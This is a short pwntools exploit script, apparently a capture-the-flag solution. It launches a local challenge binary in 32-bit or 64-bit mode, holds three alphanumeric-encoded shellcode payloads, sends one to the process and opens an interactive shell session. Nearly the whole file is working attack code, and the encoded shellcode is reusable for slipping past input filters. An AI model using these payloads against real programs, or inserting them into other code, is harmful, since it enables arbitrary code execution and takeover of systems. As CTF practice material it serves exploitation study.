from pwn import *
context.log_level = 'debug'

if args.AMD64:
    context.arch = 'amd64'
    # p = process('./chall64')
    p = process('./chall64_nocheck')
    print(p.pid)
    pause()
else:
    context.arch = 'i386'
    p = process('./chall32')

# shellcode1_asm = asm(shellcraft.sh())
shellcode2_alpha_32 = b"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIBJTK0XZ9V2U62HFMBCMYJGRHFORSE8EP2HFO3R3YBNLIJC1BZHDHS05PS06ORB2IRNFOT3RH30PWF3MYKQXMK0AA"
shellcode3_alpha_64 = b'jZTYX4UPXk9AHc49149hJG00X5EB00PXHc1149Hcq01q0Hcq41q4Hcy0Hcq0WZhZUXZX5u7141A0hZGQjX5u49j1A4H3y0XWjXHc9H39XTH394c'
shellcode4_alpha_64 = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'

# print(disasm(shellcode4_alpha_64))
p.send(shellcode4_alpha_64)
p.interactive()